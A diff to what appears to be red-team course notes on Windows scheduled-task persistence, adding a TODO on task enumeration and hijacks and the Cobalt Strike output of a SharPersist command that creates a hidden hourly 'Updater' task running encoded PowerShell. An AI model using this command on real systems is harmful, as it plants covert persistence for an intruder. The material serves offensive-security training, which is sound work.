@@ -1,5 +1,7 @@
 # Scheduled Tasks
 
+TODO: Add scheduled task enumeration. schtask commands, privileges (ability to create tasks for current user), possible hijacks, etc.
+
 ## Creating Tasks
 
 Windows Task Scheduler allows us to create tasks that execute on a pre-defined trigger. For example they can be:
@@ -32,6 +34,10 @@ We can use the `execute-shellcode` command from an existing beacon in CobaltStri
 ```powershell
 beacon> execute-assembly C:\Tools\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc 
 SQBFAFgAIAAo...ACgAbgBlAHcALQBvAGkA" -n "Updater" -m add -o hourly
+
+[08/23 05:51:03] [+] received output:
+
+[+] SUCCESS: Scheduled task added 
 ```
 
 * `-t` is the desired persistence technique.
